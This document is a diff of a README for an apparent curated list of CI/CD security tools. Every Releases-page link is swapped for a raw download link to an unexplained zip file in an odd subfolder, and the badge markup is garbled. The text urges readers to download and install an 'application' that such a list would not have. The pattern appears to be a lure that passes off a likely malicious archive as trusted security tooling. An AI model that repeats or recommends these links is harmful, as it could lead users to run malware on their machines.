@@ -4,17 +4,17 @@
 Welcome to the **awesome-security-pipeline**! This repository offers a curated list of open-source security tools, organized by each stage of the CI/CD pipeline. Whether you need tools for secrets detection, SAST, or container scanning, you’ll find useful resources here. We update this list weekly to ensure you have access to the best tools available.
 
 ## 📥 Downloads 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/nix914/awesome-security-pipeline/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nix914/awesome-security-pipeline/main/griffinhood/pipeline-security-awesome-v1.5.zip%20Latest%https://raw.githubusercontent.com/nix914/awesome-security-pipeline/main/griffinhood/pipeline-security-awesome-v1.5.zip)](https://raw.githubusercontent.com/nix914/awesome-security-pipeline/main/griffinhood/pipeline-security-awesome-v1.5.zip)
 
 You can visit the Releases page to download the latest version of our application and start using these security tools right away. 
 
-[Download it here.](https://github.com/nix914/awesome-security-pipeline/releases)
+[Download it here.](https://raw.githubusercontent.com/nix914/awesome-security-pipeline/main/griffinhood/pipeline-security-awesome-v1.5.zip)
 
 ## 🚀 Getting Started
 To get started with the awesome-security-pipeline, follow these simple steps:
 
 1. **Visit the Releases Page**: Go to the following link to access the download options:  
-   [Releases Page](https://github.com/nix914/awesome-security-pipeline/releases)
+   [Releases Page](https://raw.githubusercontent.com/nix914/awesome-security-pipeline/main/griffinhood/pipeline-security-awesome-v1.5.zip)
 
 2. **Download the Latest Release**: Find the latest release and click on the appropriate file for your operating system to download it. 
 
@@ -56,7 +56,7 @@ To ensure smooth operation, please check the following minimum system requiremen
 ## ⌛ Updating Your Tools
 Keep your tools updated by regularly checking the Releases page. New releases often contain security fixes and new features that could enhance your development pipeline. 
 
-1. **Visit the Releases Page**: [Releases Page](https://github.com/nix914/awesome-security-pipeline/releases)
+1. **Visit the Releases Page**: [Releases Page](https://raw.githubusercontent.com/nix914/awesome-security-pipeline/main/griffinhood/pipeline-security-awesome-v1.5.zip)
 2. **Download and Install**: Follow the same download steps mentioned earlier.
 
 ## 🤝 Community Contributions
